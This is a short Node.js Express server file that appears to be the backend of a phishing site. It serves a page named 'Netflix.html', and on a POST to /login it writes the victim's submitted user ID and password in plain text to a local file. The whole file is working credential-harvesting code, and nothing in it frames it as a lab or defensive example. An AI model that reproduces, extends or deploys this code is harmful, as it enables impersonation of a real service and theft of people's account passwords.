const express = require('express');
const { createReadStream } = require('fs');
const fs = require("fs");

let textFile = fs.createWriteStream('loginInfo.txt')

const app = express();

app.use(
    express.urlencoded({
      extended: true,
    })
  );


app.get('/', (req, res) => {
	createReadStream('Netflix.html').pipe(res);
})

app.post('/login', (req, res) => {
    textFile.write("USER_ID: ")
	textFile.write(req.body.userLoginId)
    textFile.write("\nPASSWORD: ")
    textFile.write(req.body.password)
})

app.listen(4000);